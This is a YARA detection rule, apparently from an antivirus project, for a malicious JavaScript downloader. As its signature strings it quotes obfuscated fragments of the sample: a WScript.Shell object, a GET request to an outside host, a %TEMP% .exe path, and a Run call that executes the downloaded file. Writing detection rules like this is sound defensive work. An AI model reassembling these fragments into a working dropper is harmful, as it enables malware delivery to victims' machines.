rule sig_20160330_295ab9ae2d38ae1918912ed7c2ba243e {
  meta:
    description = "datamaliciousorder - file 20160330_295ab9ae2d38ae1918912ed7c2ba243e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6f5de190f4019c0aac358ef2bbeef592360edfe04a77d9d4878f65e5e85fffb8"

  strings:
    $s1  = "function _G(_NJ, _KO){_X = _X * 1; return _NJ - _KO;};" fullword ascii
    $s2  = "var _X1 = function _EE() {return WScript[_PZ](\"WScript\"+\".Shell\");}(), _N = 11;" fullword ascii
    $s3  = "_P0[_B0](\"GET\", \"http://bonares.pl/x9isa\", false);" fullword ascii
    $s4  = "if (_P0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _YT(){return _D1 + \"\";};" fullword ascii
    $s6  = "function _D() {return _X1[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"iN2KjroN.ex\" + \"e\";};" fullword ascii
    $s7  = "function _AO() {return ((_AM == true) && (_AM == _P)) ? 1 : _X;};" fullword ascii
    $s8  = "function _U(_S){_X1[\"Run\"](_S, _X, _X);};" fullword ascii
    $s9  = " while (_X0){" fullword ascii
    $s10 = "function _JD()" fullword ascii
    $s11 = "var _H = new this[\"Date\"]();" fullword ascii
    $s12 = "function _OU(_U0) {var _KC = (1, 2, 3, 4, 5, _U0); return _KC;};" fullword ascii
    $s13 = "function _B(){return _PZ;};" fullword ascii
    $s14 = "function _NZ(){return 22;};" fullword ascii
    $s15 = "return _G(_F, _YJ);" fullword ascii
    $s16 = "_AM = true; " fullword ascii
    $s17 = "var _AM = false;" fullword ascii
    $s18 = "var _P = false;" fullword ascii
    $s19 = "var _IK = false;" fullword ascii
    $s20 = "_P = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}